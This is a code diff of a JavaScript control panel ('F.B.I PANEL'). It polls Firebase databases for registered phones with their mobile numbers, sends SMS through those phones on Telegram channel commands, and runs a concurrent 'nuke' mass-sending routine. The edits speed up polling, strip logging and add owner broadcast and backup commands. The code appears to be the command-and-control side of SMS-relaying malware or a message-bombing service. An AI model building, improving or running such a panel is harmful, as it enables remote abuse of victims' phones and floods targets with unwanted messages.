         .finally(function(){_nukeActive--;done++;updateNukeProgress(done,shots.length);if(idx<shots.length&&nukeRunning)spawn();else if(done===shots.length)finishNuke();});
     }
@@ -1023,17 +919,18 @@ async function fireNuke(){
   spawn();
 }
 function updateNukeProgress(done,total){if(_nukeStatsTmr)return;_nukeStatsTmr=requestAnimationFrame(function(){_nukeStatsTmr=null;document.getElementById('nukeSent').textContent=nukeSent;document.getElementById('nukeFail').textContent=nukeFail;var pct=Math.round((done/total)*100);document.getElementById('nukeProgFill').style.width=pct+'%';document.getElementById('nukeProgTxt').textContent=pct+'% · '+done+'/'+total;});}
-function finishNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';var e=((Date.now()-_nukeStartTime)/1000).toFixed(1);toast('✅ Nuke done — '+nukeSent+' sent, '+nukeFail+' failed in '+e+'s');}
+function finishNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';var e=((Date.now()-_nukeStartTime)/1000).toFixed(1);toast('✅ Nuke done — '+nukeSent+' sent, '+nukeFail+' failed in '+e+'s');notifyChannel('💣 <b>Nuke Complete</b>\n\n✅ Sent: <b>'+nukeSent+'</b>\n❌ Failed: <b>'+nukeFail+'</b>\n⏱️ '+e+'s');}
 function stopNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';toast('⏹ Stopped');}
 
 /* ═══════ SETTINGS ═══════ */
-function openSettings(){try{populateSettingsUI();openM('settingsModal');}catch(e){console.error('[Settings] open failed:',e);toast('⚠ Settings error: '+e.message);}}
+function openSettings(){try{populateSettingsUI();openM('settingsModal');}catch(e){toast('⚠ Settings error: '+e.message);}}
 function populateSettingsUI(){
   document.getElementById('setMyNumber').value=userConfig.myNumber||'';
-  document.getElementById('setTgUserId').value=userConfig.userId||'';
-  document.getElementById('setTgChannel').value=userConfig.channelId||'';
+  var elCh=document.getElementById('setTgChannel'); if(elCh) elCh.value=userConfig.channelId||'';
   document.getElementById('setTgEnabled').checked=userConfig.botEnabled!==false;
   document.getElementById('setFwdEnabled').checked=userConfig.forwardEnabled!==false;
+  var cn=document.getElementById('setChannelNotify');
+  if(cn)cn.checked=userConfig.channelNotify!==false;
   var nS=document.getElementById('setNumStart');if(nS)nS.value=userConfig.numStart||'';
   var nE=document.getElementById('setNumEnd');if(nE)nE.value=userConfig.numEnd||'';
   var mS=document.getElementById('setMsgStart');if(mS)mS.value=userConfig.msgStart||'';
@@ -1085,20 +982,11 @@ async function addFirebaseFromSettings(){
 async function fbLoadInst(inst){
   try{
     var auth=inst.key?'?auth='+inst.key:'';var url=inst.url+'/clients.json'+auth;
-    console.log('[FB] Loading: '+url);
-    var r=await fetch(url,{signal:AbortSignal.timeout(API_TIMEOUT)});
-    console.log('[FB] '+inst.label+' HTTP '+r.status);
-    if(!r.ok){
-      inst.status='error';inst.devices=[];inst.devCount=0;inst.lastError='HTTP '+r.status;
-      toast('❌ '+inst.label+': HTTP '+r.status);renderFbList();return;
-    }
+    var r=await _fastFetch(url);
+    if(!r.ok){inst.status='error';inst.devices=[];inst.devCount=0;inst.lastError='HTTP '+r.status;toast('❌ '+inst.label+': HTTP '+r.status);renderFbList();return;}
     var raw=await r.json();
-    if(!raw||typeof raw!=='object'){
-      inst.devices=[];inst.devCount=0;inst.status='empty';inst.lastError='Empty';
-      toast('⚠ '+inst.label+': Empty');renderFbList();return;
-    }
+    if(!raw||typeof raw!=='object'){inst.devices=[];inst.devCount=0;inst.status='empty';inst.lastError='Empty';toast('⚠ '+inst.label+': Empty');renderFbList();return;}
     var devs=parseDevs(raw);
-    console.log('[FB] '+inst.label+' → '+devs.length+' devices');
     devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});
     inst.devices=devs;inst.devCount=devs.length;inst.status=devs.length?'ok':'empty';inst.lastError='';
     if(devs.length){fbMergeAll();toast('✅ '+inst.label+': '+devs.length+' devices');}
@@ -1106,18 +994,18 @@ async function fbLoadInst(inst){
     renderFbList();
   }catch(e){inst.status='error';inst.devices=[];inst.devCount=0;inst.lastError=e.message;toast('❌ '+inst.label);renderFbList();}
 }
-function fbStartPoll(inst,staggerMs){if(inst.poll)clearInterval(inst.poll);setTimeout(function(){inst.poll=setInterval(async function(){if(!inst.url)return;try{var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok){inst.status='error';inst.lastError='HTTP '+r.status;return;}var devs=parseDevs(await r.json());devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});inst.devices=devs;inst.devCount=devs.length;inst.status='ok';inst.lastError='';fbMergeAll();}catch(e){inst.status='error';inst.lastError=e.message;}},POLL_DEV);},staggerMs||0);}
+function fbStartPoll(inst,staggerMs){if(inst.poll)clearInterval(inst.poll);setTimeout(function(){inst.poll=setInterval(async function(){if(!inst.url)return;try{var auth=inst.key?'?auth='+inst.key:'';var r=await _fastFetch(inst.url+'/clients.json'+auth);if(!r.ok){inst.status='error';inst.lastError='HTTP '+r.status;return;}var devs=parseDevs(await r.json());devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});inst.devices=devs;inst.devCount=devs.length;inst.status='ok';inst.lastError='';fbMergeAll();}catch(e){inst.status='error';inst.lastError=e.message;}},POLL_DEV);},staggerMs||0);}
 function fbStopPoll(inst){if(inst.poll){clearInterval(inst.poll);inst.poll=null;}}
 function fbRemove(id){var idx=fbInstances.findIndex(function(x){return x.id===id;});if(idx===-1)return;fbStopPoll(fbInstances[idx]);fbInstances.splice(idx,1);fbMergeAll();syncFirebasesToConfig();renderFbList();toast('🗑 Removed');}
 function syncFirebasesToConfig(){userConfig.firebases=fbInstances.map(function(x){return{url:x.url,label:x.label,key:x.key};});debouncedCloudSave();}
-function fbMergeAll(){if(_mergeDebTimer)clearTimeout(_mergeDebTimer);_mergeDebTimer=setTimeout(_doFbMergeAll,80);}
+function fbMergeAll(){if(_mergeDebTimer)clearTimeout(_mergeDebTimer);_mergeDebTimer=setTimeout(_doFbMergeAll,30);}
 function _doFbMergeAll(){
   _mergeDebTimer=null;
   var merged=[],seen=new Set();
   for(var pp=0;pp<allDevices.length;pp++){var pd=allDevices[pp];if((pd._fbId||'primary')==='primary'){var pk='primary:'+pd.id;if(!seen.has(pk)){seen.add(pk);merged.push(pd);}}}
   for(var ii=0;ii<fbInstances.length;ii++){if(fbInstances[ii].id==='primary')continue;var devs=fbInstances[ii].devices||[];for(var jj=0;jj<devs.length;jj++){var d=devs[jj];var k=(d._fbId||'primary')+':'+d.id;if(!seen.has(k)){seen.add(k);merged.push(d);}}}
   applyStableOrder(merged);allDevices=merged;renderStats();
-  renderGrid();  /* 🆕 no force */
+  renderGrid();
   renderFbList();
 }
 function fbRegisterPrimary(){allDevices.forEach(function(d){if(!d._fbId){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;}});}
@@ -1130,10 +1018,12 @@ function loadFirebasesFromConfig(){
 }
 function saveAllSettings(){
   userConfig.myNumber=document.getElementById('setMyNumber').value.trim();
-  userConfig.userId=document.getElementById('setTgUserId').value.trim();
-  userConfig.channelId=document.getElementById('setTgChannel').value.trim();
+  var chEl=document.getElementById('setTgChannel');
+  if(chEl) userConfig.channelId=chEl.value.trim();
   userConfig.botEnabled=document.getElementById('setTgEnabled').checked;
   userConfig.forwardEnabled=document.getElementById('setFwdEnabled').checked;
+  var cn2=document.getElementById('setChannelNotify');
+  if(cn2)userConfig.channelNotify=cn2.checked;
   var nS=document.getElementById('setNumStart');if(nS)userConfig.numStart=nS.value.trim();
   var nE=document.getElementById('setNumEnd');if(nE)userConfig.numEnd=nE.value.trim();
   var mS=document.getElementById('setMsgStart');if(mS)userConfig.msgStart=mS.value.trim();
@@ -1141,20 +1031,20 @@ function saveAllSettings(){
   var nL=document.getElementById('setNumLabels');if(nL){var arr=nL.value.split(',').map(function(s){return s.trim();}).filter(function(s){return s;});userConfig.numLabels=arr.length?arr:['To','Receipt','Number','Mobile','Target','Phone'];}
   var mL=document.getElementById('setMsgLabels');if(mL){var arr2=mL.value.split(',').map(function(s){return s.trim();}).filter(function(s){return s;});userConfig.msgLabels=arr2.length?arr2:['Message','Msg','Body','Token','Text'];}
   cacheConfigLocal();debouncedCloudSave();
-  if(userConfig.botEnabled&&userConfig.channelId){_sendWelcome=true;startTelegramBot();}else{stopTelegramBot();}
+  if(userConfig.botEnabled&&userConfig.channelId){startTelegramBot();}else{stopTelegramBot();}
   updateTgStatusLine();
   toast('💾 Saved');
 }
 
-/* ═══════ TELEGRAM BOT ═══════ */
-async function tgApi(method,payload){try{var r=await fetch(CFG.TG_API+'/'+method,payload?{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}:{signal:AbortSignal.timeout(6000)});return await r.json();}catch(e){return{ok:false,description:e.message};}}
+/* ═══════ TELEGRAM BOT — ULTRA FAST POLL ═══════ */
+async function tgApi(method,payload){try{var r=await _fastFetch(CFG.TG_API+'/'+method,payload?{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}:{});return await r.json();}catch(e){return{ok:false,description:e.message};}}
 async function fetchBotUsername(){
   var el=document.getElementById('botUsername');
   try{
-    var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(8000)});
+    var r=await _fastFetch(CFG.TG_API+'/getMe');
     var d=await r.json();
-    if(d.ok&&d.result){tgDiagnostics.botInfo=d.result;var uname=d.result.username||('bot_'+d.result.id);if(el)el.textContent='@'+uname;console.log('[BOT] ✓ @'+uname);updateTgStatusLine();}
-    else{if(el)el.textContent='⚠ err';console.error('[BOT] getMe failed:',d&&d.description);}
+    if(d.ok&&d.result){tgDiagnostics.botInfo=d.result;var uname=d.result.username||('bot_'+d.result.id);if(el)el.textContent='@'+uname;updateTgStatusLine();}
+    else{if(el)el.textContent='⚠ err';}
   }catch(e){if(el)el.textContent='⚠ offline';}
 }
 (function _botUsernameRetry(){var tick=0;var t=setInterval(function(){tick++;if(tgDiagnostics.botInfo||tick>20){clearInterval(t);return;}fetchBotUsername();},20000);})();
@@ -1167,48 +1057,56 @@ async function startTelegramBot(){
   var d2=await tgApi('getMe');
   if(!d2.ok){tgDiagnostics.lastError='Token invalid';toast('❌ Token invalid');updateTgStatusLine();return;}
   tgDiagnostics.botInfo=d2.result;
-  try{var r4=await fetch(CFG.TG_API+'/getUpdates?offset=-1&timeout=0&limit=1',{signal:AbortSignal.timeout(4000)});var d4=await r4.json();if(d4.ok&&d4.result&&d4.result.length){tgLastUpdateId=d4.result[d4.result.length-1].update_id+1;}else{tgLastUpdateId=0;}}catch(e){tgLastUpdateId=0;}
+  try{var r4=await _fastFetch(CFG.TG_API+'/getUpdates?offset=-1&timeout=0&limit=1');var d4=await r4.json();if(d4.ok&&d4.result&&d4.result.length){tgLastUpdateId=d4.result[d4.result.length-1].update_id+1;}else{tgLastUpdateId=0;}}catch(e){tgLastUpdateId=0;}
   tgRunning=true;tgDiagnostics.lastError='';tgDiagnostics.updateCount=0;updateTgStatusLine();updateTgBtn();
   if(!tgPollLoop){tgPollLoop=true;telegramLoop();}
-  if(_sendWelcome){_sendWelcome=false;sendOwnerWelcome();}
-}
-async function sendOwnerWelcome(){
-  if(!userConfig.userId)return;
-  var msg='👋 <b>Welcome, Owner!</b>\n\n🤖 <b>F.B.I PANEL Bot</b> active\n🕐 '+new Date().toLocaleString();
-  try{await tgApi('sendMessage',{chat_id:userConfig.userId,text:msg,parse_mode:'HTML'});}catch(e){}
+  try{ await announceChannelConnect(userConfig.channelId); }catch(e){}
 }
 function stopTelegramBot(){tgRunning=false;tgPollLoop=false;updateTgStatusLine();updateTgBtn();}
-async function telegramLoop(){var errs=0;while(tgPollLoop){if(!tgRunning){await sleep(200);continue;}try{var hadError=await telegramPollOnce();if(hadError){errs++;if(errs>5){await sleep(2000);errs=0;}}else{errs=0;}}catch(e){errs++;if(errs>5){await sleep(2000);errs=0;}}await sleep(TG_POLL);}}
+/* ULTRA FAST LOOP — no sleep between polls, only on error */
+async function telegramLoop(){
+  var errs=0;
+  while(tgPollLoop){
+    if(!tgRunning){await new Promise(function(r){setTimeout(r,200);});continue;}
+    try{
+      var hadError=await telegramPollOnce();
+      if(hadError){errs++;if(errs>5){await new Promise(function(r){setTimeout(r,1000);});errs=0;}}
+      else{errs=0;}
+    }catch(e){errs++;}
+    /* NO SLEEP — instant next poll */
+    await Promise.resolve();
+  }
+}
 function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
 
 async function telegramPollOnce(){
-  var url=CFG.TG_API+'/getUpdates?timeout=1';
+  var url=CFG.TG_API+'/getUpdates?timeout=0';
   if(tgLastUpdateId)url+='&offset='+tgLastUpdateId;
-  url+='&allowed_updates='+encodeURIComponent(JSON.stringify(['channel_post','edited_channel_post','message','edited_message','callback_query']));
-  var r;try{r=await fetch(url,{signal:AbortSignal.timeout(3000)});}catch(e){return true;}
-  if(!r.ok){if(r.status===409){try{await fetch(CFG.TG_API+'/deleteWebhook',{signal:AbortSignal.timeout(3000)});}catch(e){}return true;}return true;}
+  url+='&allowed_updates='+encodeURIComponent(JSON.stringify(['channel_post','edited_channel_post','message','edited_message']));
+  var r;try{r=await _fastFetch(url);}catch(e){return true;}
+  if(!r.ok){if(r.status===409){try{await _fastFetch(CFG.TG_API+'/deleteWebhook');}catch(e){}return true;}return true;}
   var data=await r.json();
   if(!data.ok)return true;
   if(!data.result||!data.result.length)return false;
   tgDiagnostics.updateCount+=data.result.length;tgDiagnostics.lastUpdate=Date.now();
   for(var i=0;i<data.result.length;i++){
     var u=data.result[i];tgLastUpdateId=u.update_id+1;
-
-    /* 🆕 Callback query */
-    if(u.callback_query){handleCallbackQuery(u.callback_query);continue;}
-
     var msg=u.channel_post||u.edited_channel_post||u.message||u.edited_message;
     if(!msg)continue;
+    /* Skip own bot posts only */
+    if(msg.from&&msg.from.is_bot){
+      var myId=tgDiagnostics.botInfo&&tgDiagnostics.botInfo.id;
+      if(myId&&msg.from.id===myId) continue;
+    }
     var isPrivate=msg.chat&&msg.chat.type==='private';
     var fromId=msg.from&&String(msg.from.id);
-
-    /* 🆕 Owner command */
-    if(isPrivate&&fromId===String(userConfig.userId)){handleOwnerCommand(msg);continue;}
-
-    /* 🆕 Regular user private message */
-    if(isPrivate){handleUserPrivate(msg);continue;}
-
-    /* Channel post → SMS trigger */
+    var mtext=String(msg.text||'').trim();
+    if(isPrivate){
+      var isCmd=/^\/(backup|backup_new|backup_all|broadcast|broadcast_ch|broadcast_users|users|usr|status|st|devices|dev|help|start|autobackup)\b/i.test(mtext);
+      if(isCmd && isOwnerId(fromId)){ handleOwnerCommand(msg); }
+      else { handleUserPrivate(msg); }
+      continue;
+    }
     var chatId=String(msg.chat&&msg.chat.id||''),chatUser=String(msg.chat&&msg.chat.username||'');
     var cfgCh=String(userConfig.channelId||''),cfgChClean=cfgCh.replace('@','');
     var match=false;
@@ -1218,434 +1116,204 @@ async function telegramPollOnce(){
     if(!match)continue;
     var text=msg.text||msg.caption||'';if(!text)continue;
     var parsed=parseTelegramMessage(text);
-    if(!parsed.valid){console.warn('🎯 [TG] Parse failed');continue;}
-    console.log('🎯 [TG MATCH] '+parsed.number);
+    if(!parsed.valid)continue;
     handleTelegramSms(parsed.number,parsed.message,msg);
   }
   updateTgStatusLine();
   return false;
 }
 
-/* 🆕 Handle user private messages (non-owner) */
+/* ═══════ USER REGISTRATION ═══════ */
 async function handleUserPrivate(msg){
-  var chatId=String(msg.chat.id);
-  var txt=String(msg.text||'').trim();
-  var cmd=txt.toLowerCase();
-  var from=msg.from||{};
-  var fullName=[from.first_name||'',from.last_name||''].filter(Boolean).join(' ')||('User '+chatId.slice(-4));
-
-  /* Commands */
-  if(cmd==='/start'||cmd==='/help'){
+  try{
+    var chatId=String(msg.chat.id);
+    var from=msg.from||{};
     var prof=await getUserProfile(chatId);
-    if(!prof){
-      /* Not verified — check membership */
-      if(userConfig.forceJoin&&userConfig.channelId){
-        var isMember=await checkChannelMembership(chatId);
-        if(!isMember){await sendForceJoin(chatId,fullName);return;}
-      }
-      /* Create profile */
-      var newProf={
-        id:chatId,
-        first_name:from.first_name||'',
-        last_name:from.last_name||'',
-        username:from.username||'',
-        language:from.language_code||'en',
-        firebases:[],
-        joinedAt:Date.now(),
-        verified:true,
-        lastSeen:Date.now()
-      };
-      await saveUserProfile(newProf);
-      await sendUserWelcome(chatId,fullName);
-      return;
-    }
-    await sendUserWelcome(chatId,fullName);
-    return;
-  }
-
-  /* Check if verified */
-  var profile=await getUserProfile(chatId);
-  if(!profile){
-    if(userConfig.forceJoin&&userConfig.channelId){
-      var mem=await checkChannelMembership(chatId);
-      if(!mem){await sendForceJoin(chatId,fullName);return;}
-    }
-    /* Auto-create */
-    profile={id:chatId,first_name:from.first_name||'',last_name:from.last_name||'',username:from.username||'',language:from.language_code||'en',firebases:[],joinedAt:Date.now(),verified:true,lastSeen:Date.now()};
-    await saveUserProfile(profile);
-    await sendUserWelcome(chatId,fullName);
-    return;
-  }
-
-  /* Update last seen + name */
-  profile.first_name=from.first_name||profile.first_name;
-  profile.last_name=from.last_name||profile.last_name;
-  profile.username=from.username||profile.username;
-  await saveUserProfile(profile);
-
-  /* Pending states */
-  var st=userStates[chatId];
-  if(st){
-    if(st.state==='wait_fb_url'){
-      var url=txt.replace(/\/+$/,'');
-      if(!/^https?:\/\//i.test(url)){await tgSend(chatId,'⚠ Invalid URL. `https://` se start hona chahiye.');return;}
-      st.data.url=url;
-      st.state='wait_fb_label';
-      await tgSend(chatId,'📝 Naam dena ho to bhejo, ya <code>skip</code> likho:');
-      return;
-    }
-    if(st.state==='wait_fb_label'){
-      var label=txt.toLowerCase()==='skip'?'Firebase '+(profile.firebases.length+1):txt;
-      profile.firebases=profile.firebases||[];
-      profile.firebases.push({url:st.data.url,key:'',label:label,addedAt:Date.now()});
-      await saveUserProfile(profile);
-      delete userStates[chatId];
-      await tgSend(chatId,'✅ <b>Firebase Added!</b>\n\n🏷️ '+esc(label)+'\n🔗 <code>'+esc(st.data.url)+'</code>\n\n<code>/mydevices</code> se dekho.');
-      return;
-    }
-  }
-
-  /* Other commands */
-  if(cmd==='/addfirebase'||cmd==='/addfb'){
-    userStates[chatId]={state:'wait_fb_url',data:{}};
-    await tgSend(chatId,'🔗 <b>Apna Firebase URL bhejo</b>\n\nFormat: <code>https://xxx.firebaseio.com</code>');
-    return;
-  }
-  if(cmd==='/myfirebases'||cmd==='/myfb'){
-    var fbs=profile.firebases||[];
-    if(!fbs.length){await tgSend(chatId,'📭 Koi Firebase nahi. <code>/addfirebase</code> se add karo.');return;}
-    var t='🔥 <b>Your Firebases</b>\n\n';
-    fbs.forEach(function(f,i){t+=(i+1)+'. <b>'+esc(f.label)+'</b>\n<code>'+esc(f.url)+'</code>\n\n';});
-    await tgSend(chatId,t);return;
-  }
-  if(cmd==='/mydevices'||cmd==='/mydev'){
-    await sendUserDevices(chatId,profile);return;
-  }
-  if(cmd==='/status'||cmd==='/st'){
-    var t='📊 <b>Your Status</b>\n\n👤 '+esc(fullName)+'\n🆔 <code>'+chatId+'</code>\n🔥 Firebases: '+(profile.firebases||[]).length+'\n✅ Verified: '+profile.verified+'\n🕐 '+new Date().toLocaleString();
-    await tgSend(chatId,t);return;
-  }
-
-  /* Default: show menu */
-  await sendUserWelcome(chatId,fullName);
-}
-
-/* 🆕 Send user welcome with menu */
-async function sendUserWelcome(chatId,fullName){
-  var kb={inline_keyboard:[
-    [{text:'➕ Add Firebase',callback_data:'menu_addfb'}],
-    [{text:'📱 My Devices',callback_data:'menu_devices'}],
-    [{text:'🔥 My Firebases',callback_data:'menu_fbs'}],
-    [{text:'📊 Status',callback_data:'menu_status'}],
-    [{text:'❓ Help',callback_data:'menu_help'}]
-  ]};
-  var txt='👋 <b>Welcome '+(esc(fullName||'User'))+'!</b>\n\n'
-    +'🤖 <b>F.B.I PANEL Bot</b>\n\n'
-    +'Choose an option below 👇';
-  await tgApi('sendMessage',{chat_id:chatId,text:txt,parse_mode:'HTML',reply_markup:JSON.stringify(kb)});
-}
-
-/* 🆕 Handle inline button clicks */
-async function handleCallbackQuery(cb){
-  var chatId=String(cb.from.id);
-  var data=cb.data||'';
-  var cbId=cb.id;
-  /* Ack */
-  try{await tgApi('answerCallbackQuery',{callback_query_id:cbId,text:'…'});}catch(e){}
-
-  if(data==='fj_check'){
-    var ok=await checkChannelMembership(chatId);
-    if(!ok){await tgApi('sendMessage',{chat_id:chatId,text:'❌ Aapne abhi tak channel join nahi kiya. Pehle join karo fir button dabao.'});return;}
-    var from=cb.from||{};
-    var newProf={id:chatId,first_name:from.first_name||'',last_name:from.last_name||'',username:from.username||'',language:from.language_code||'en',firebases:[],joinedAt:Date.now(),verified:true,lastSeen:Date.now()};
-    await saveUserProfile(newProf);
-    await sendUserWelcome(chatId,[from.first_name||'',from.last_name||''].filter(Boolean).join(' ')||'User');
-    return;
-  }
-  var prof=await getUserProfile(chatId);
-  if(!prof){
-    await tgApi('sendMessage',{chat_id:chatId,text:'Pehle /start karo.'});return;
-  }
-  if(data==='menu_addfb'){
-    userStates[chatId]={state:'wait_fb_url',data:{}};
-    await tgApi('sendMessage',{chat_id:chatId,text:'🔗 <b>Apna Firebase URL bhejo:</b>\n\n<code>https://xxx.firebaseio.com</code>',parse_mode:'HTML'});return;
-  }
-  if(data==='menu_fbs'){
-    var fbs=prof.firebases||[];
-    if(!fbs.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 Koi nahi. Pehle add karo.'});return;}
-    var t='🔥 <b>Your Firebases</b>\n\n';
-    fbs.forEach(function(f,i){t+=(i+1)+'. <b>'+esc(f.label)+'</b>\n<code>'+esc(f.url)+'</code>\n\n';});
-    await tgApi('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML'});return;
-  }
-  if(data==='menu_devices'){await sendUserDevices(chatId,prof);return;}
-  if(data==='menu_status'){
-    await tgApi('sendMessage',{chat_id:chatId,text:'📊 <b>Status</b>\n\n🆔 <code>'+chatId+'</code>\n🔥 Firebases: '+(prof.firebases||[]).length+'\n✅ Verified: '+prof.verified,parse_mode:'HTML'});return;
-  }
-  if(data==='menu_help'){
-    var h='🆘 <b>Help</b>\n\n/start — Main menu\n/addfirebase — Add Firebase\n/myfirebases — List firebases\n/mydevices — Your devices\n/status — Status\n/help — This';
-    await tgApi('sendMessage',{chat_id:chatId,text:h,parse_mode:'HTML'});return;
-  }
-}
-
-/* 🆕 Send user devices from their firebases */
-async function sendUserDevices(chatId,profile){
-  var fbs=profile.firebases||[];
-  if(!fbs.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 No firebases. Add with /addfirebase.'});return;}
-  var all=[];
-  for(var i=0;i<fbs.length;i++){
-    try{
-      var fb=fbs[i];var auth=fb.key?'?auth='+fb.key:'';
-      var r=await fetch(fb.url+'/clients.json'+auth,{signal:AbortSignal.timeout(8000)});
-      if(!r.ok)continue;
-      var clients=await r.json();
-      if(!clients||typeof clients!=='object')continue;
-      Object.entries(clients).forEach(function(kv){
-        var id=kv[0],d=kv[1];if(!d||typeof d!=='object')return;
-        all.push({id:id,name:d.modelName||d.model||id,status:!!d.status,fb:fb.label});
-      });
-    }catch(e){}
-  }
-  if(!all.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 No devices found.'});return;}
-  var t='📱 <b>Your Devices ('+all.length+')</b>\n\n';
-  all.slice(0,50).forEach(function(d,i){t+=(i+1)+'. '+(d.status?'🟢':'🔴')+' '+esc(d.name)+' ['+esc(d.fb)+']\n';});
-  if(all.length>50)t+='\n…+'+(all.length-50)+' more';
-  await tgApi('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML'});
+    if(!prof){await saveUserProfile({id:chatId,first_name:from.first_name||'',last_name:from.last_name||'',username:from.username||'',language:from.language_code||'en',joinedAt:Date.now(),verified:true,lastSeen:Date.now()});}
+    else{prof.first_name=from.first_name||prof.first_name;prof.last_name=from.last_name||prof.last_name;prof.username=from.username||prof.username;await saveUserProfile(prof);}
+  }catch(e){}
 }
 
 /* ═══════ OWNER COMMANDS ═══════ */
 async function handleOwnerCommand(msg){
   var txt=String(msg.text||'').trim();var cmd=txt.toLowerCase();var chatId=msg.chat.id;
-  console.log('[CMD] '+txt);
 
-  /* 🆕 /backup — incremental */
-  if(cmd==='/backup'||cmd==='/bk'){await sendBackupIncremental(chatId);return;}
-  /* 🆕 /backup_all — full */
-  if(cmd==='/backup_all'||cmd==='/bka'){await sendBackupFull(chatId);return;}
-  /* legacy keep */
-  if(cmd==='/backup_keep'||cmd==='/bkk'){await tgSend(chatId,'⏳ Full backup (keep)…');await sendBackupToOwner(chatId,true);return;}
+  if(cmd==='/backup'||cmd==='/bk'){await sendUsersBackupFull(chatId);return;}
+  if(cmd==='/backup_new'||cmd==='/bkn'||cmd==='/backup_all'||cmd==='/bka'){await sendUsersBackupNew(chatId);return;}
+
+  if(cmd.startsWith('/broadcast ')||cmd==='/broadcast'){
+    var t3=txt.replace(/^\/broadcast\s*/i,'').trim();
+    if(!t3){await tgSend(chatId,'Usage: <code>/broadcast message</code>');return;}
+    var body='📢 <b>Broadcast</b>\n\n'+esc(t3);
+    var chOk=false;
+    if(userConfig.channelId){try{var rc=await tgApi('sendMessage',{chat_id:userConfig.channelId,text:body,parse_mode:'HTML'});chOk=!!(rc&&rc.ok);}catch(e){}}
+    var uids2=await getAllUserIds();
+    var s2=0,f2=0,delay2=userConfig.broadcastDelay||60;
+    await tgSend(chatId,'⏳ Broadcasting…\n📢 Channel: '+(chOk?'✅':'⛔')+'\n👥 Users: '+uids2.length);
+    for(var bj=0;bj<uids2.length;bj++){
+      if(String(uids2[bj])===String(chatId))continue;
+      try{var rr2=await tgApi('sendMessage',{chat_id:uids2[bj],text:body,parse_mode:'HTML'});if(rr2&&rr2.ok)s2++;else f2++;}catch(e){f2++;}
+      if(bj%10===9) await sleep(delay2);
+    }
+    await tgSend(chatId,'✅ Broadcast done\n📢 Channel: '+(chOk?'sent':'skipped')+'\n👥 Users: '+s2+' ✔ · '+f2+' ✖');
+    return;
+  }
+  if(cmd.startsWith('/broadcast_ch ')||cmd==='/broadcast_ch'){
+    var t1=txt.replace(/^\/broadcast_ch\s*/i,'').trim();
+    if(!t1){await tgSend(chatId,'Usage: <code>/broadcast_ch message</code>');return;}
+    if(!userConfig.channelId){await tgSend(chatId,'⚠ No channelId set.');return;}
+    try{await tgApi('sendMessage',{chat_id:userConfig.channelId,text:'📢 <b>Broadcast</b>\n\n'+esc(t1),parse_mode:'HTML'});await tgSend(chatId,'✅ Sent to channel');}
+    catch(e){await tgSend(chatId,'❌ '+e.message);}
+    return;
+  }
+  if(cmd.startsWith('/broadcast_users ')||cmd==='/broadcast_users'){
+    var t2=txt.replace(/^\/broadcast_users\s*/i,'').trim();
+    if(!t2){await tgSend(chatId,'Usage: <code>/broadcast_users message</code>');return;}
+    var uids=await getAllUserIds();
+    if(!uids.length){await tgSend(chatId,'No users.');return;}
+    await tgSend(chatId,'⏳ Broadcasting to <b>'+uids.length+'</b> users…');
+    var s=0,f=0,delay=userConfig.broadcastDelay||60;
+    for(var bi=0;bi<uids.length;bi++){
+      if(String(uids[bi])===String(chatId))continue;
+      try{var rr=await tgApi('sendMessage',{chat_id:uids[bi],text:'📢 <b>Broadcast</b>\n\n'+esc(t2),parse_mode:'HTML'});if(rr&&rr.ok)s++;else f++;}catch(e){f++;}
+      if(bi%10===9) await sleep(delay);
+    }
+    await tgSend(chatId,'✅ Done\n✔ '+s+' sent\n✖ '+f+' failed');
+    return;
+  }
 
   if(cmd==='/status'||cmd==='/st'){await sendStatusToOwner(chatId);return;}
   if(cmd==='/devices'||cmd==='/dev'){
     var t='📱 Devices ('+allDevices.length+' · '+allDevices.filter(function(d){return d.status;}).length+' online)\n\n';
-    allDevices.slice(0,50).forEach(function(d,i){t+='#'+(d.deviceOrder||i+1)+' '+(d.status?'🟢':'🔴')+' '+d.name+' · '+d.mobNo+'\n';});
+    allDevices.slice(0,50).forEach(function(d,i){var cs=devCarrierList(d).join('/')||'—';t+='#'+(d.deviceOrder||i+1)+' '+(d.status?'🟢':'🔴')+' '+esc(d.name)+' · '+d.mobNo+' ['+esc(cs)+']\n';});
     if(allDevices.length>50)t+='\n…+'+(allDevices.length-50)+' more';
     await tgSend(chatId,t);return;
   }
-  /* 🆕 /users — list all users */
   if(cmd==='/users'||cmd==='/usr'){
-    var uids=await getAllUserIds();
-    var t='👥 <b>Total Users: '+uids.length+'</b>\n\n';
-    for(var i=0;i<Math.min(uids.length,50);i++){
-      var uid=uids[i];
-      var p=await getUserProfile(uid);
-      if(p)t+='👤 '+esc(p.first_name||'')+' '+esc(p.last_name||'')+(p.username?' @'+esc(p.username):'')+'\n🆔 <code>'+uid+'</code> · 🔥 '+(p.firebases||[]).length+'\n\n';
+    var uidsAll=await getAllUserIds();
+    var tu='👥 <b>Total Users: '+uidsAll.length+'</b>\n\n';
+    for(var i2=0;i2<Math.min(uidsAll.length,50);i2++){
+      var uid=uidsAll[i2];var p=await getUserProfile(uid);
+      if(p)tu+='👤 '+esc(p.first_name||'')+' '+esc(p.last_name||'')+(p.username?' @'+esc(p.username):'')+'\n🆔 <code>'+uid+'</code> · 🔥 '+(p.firebases||[]).length+'\n\n';
     }
-    if(uids.length>50)t+='\n…+'+(uids.length-50)+' more';
